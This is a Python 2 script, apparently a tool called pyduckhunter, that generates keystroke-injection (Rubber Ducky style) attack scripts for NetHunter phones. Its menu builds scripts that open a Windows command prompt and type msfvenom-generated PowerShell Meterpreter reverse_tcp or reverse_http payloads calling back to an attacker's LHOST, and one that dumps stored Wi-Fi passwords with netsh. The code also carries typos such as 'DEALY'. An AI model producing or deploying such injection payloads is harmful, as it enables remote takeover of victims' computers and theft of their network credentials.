#!/usr/bin/python env
#-*-coding:utf-8-*-
import os,sys
pythonname = sys.argv[0]
print """ ____            _            _    _                 _
|  _ \ _   _  __| |_   _  ___| | _| |__  _   _ _ __ | |_ ___ _ __
| |_) | | | |/ _` | | | |/ __| |/ / '_ \| | | | '_ \| __/ _ \ '__|
|  __/| |_| | (_| | |_| | (__|   <| | | | |_| | | | | ||  __/ |
|_|    \__, |\__,_|\__,_|\___|_|\_\_| |_|\__,_|_| |_|\__\___|_|
       |___/

version:0.1

[\033[1;32;1m|..|\033[0m] Written By: Suzumiya QQ:1635123039                 [\033[1;32;1m|..|\033[0m]
[\033[1;32;1m|..|\033[0m] Blog: http://suzumiya.me                           [\033[1;32;1m|..|\033[0m]

这是一款快捷生成nethunter手机DUCKHUNTER功能的攻击代码项目

请输入你的选择:\n
0.demo test
1. Payloads for powershell
2. Payloads for wireless
"""
choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
if choise == "0":
    f = open('output/demo.txt', 'w')
    f.write("CAPSLOCK\n")
    f.write("GUI r\n")
    f.write("DEALY 1000\n")
    f.write("STRING notepad\n")
    f.write("DEALY 1000\n")
    f.write("Hello World\n")
    f.write("CAPSLOCK")
    f.close()
    f = open('output/demo.txt', 'r')
    f.readlines()
    print "文件生成在 output/demo.txt"
elif choise == "1":
    print "1. windows/meterpreter/reverse_tcp"
    print "2. windows/meterpreter/reverse_http\n"
    choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
    if choise =="1":
        lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LHOST:")
        lport = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LPORT:")
        def msfvenom(lhost,lport):
            c = "msfvenom -p windows/meterpreter/reverse_tcp lhost="+lhost+" lport="+lport+" -f psh-cmd"
            return c
        shellout = os.popen(msfvenom(lhost,lport)).read()
        f = open('output/out_reverse_tcp.txt','w')
        f.write("CAPSLOCK\n")
        f.write("GUI r\n")
        f.write("DEALY 1000\n")
        f.write("STRING cmd\n")
        f.write("DEALY 1000\n")
        f.write("STRING ")
        f.write(shellout.swapcase())
        f.write("CAPSLOCK")
        f.close()
        f = open('output/out_reverse_tcp.txt','r')
        f.readlines()
        print "文件生成在 output/out_reverse_tcp.txt"
    elif choise == "2":
        lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LHOST:")
        lport = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LPORT:")
        def msfvenom(lhost, lport):
            c = "msfvenom -p windows/meterpreter/reverse_http lhost=" + lhost + " lport=" + lport + " -f psh-cmd"
            return c
        shellout = os.popen(msfvenom(lhost, lport)).read()
        f = open('output/out_reverse_http.txt', 'w')
        f.write("CAPSLOCK\n")
        f.write("GUI r\n")
        f.write("DEALY 1000\n")
        f.write("STRING cmd\n")
        f.write("DEALY 1000\n")
        f.write("STRING ")
        f.write(shellout.swapcase())
        f.write("CAPSLOCK")
        f.close()
        f = open('output/out_reverse_http.txt', 'r')
        f.readlines()
        print "文件生成在 output/out_reverse_http.txt"
elif choise == "2":
    f = open('output/out_wirless.txt', 'w')
    f.write("CAPSLOCK\n")
    f.write("GUI r\n")
    f.write("DEALY 1000\n")
    f.write("STRING cmd\n")
    f.write("DEALY 1000\n")
    f.write("STRING ")
    shellout = "for /f "'\"skip=9 tokens=1,2 delims=:" %i in (''\'netsh wlan show profiles''\') do ?@echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
    f.write(shellout.swapcase())
    f.write("CAPSLOCK")
    f.close()
    f = open('output/out_wirless.txt', 'r')
    f.readlines()
    print "文件生成在 output/out_wirless.txt"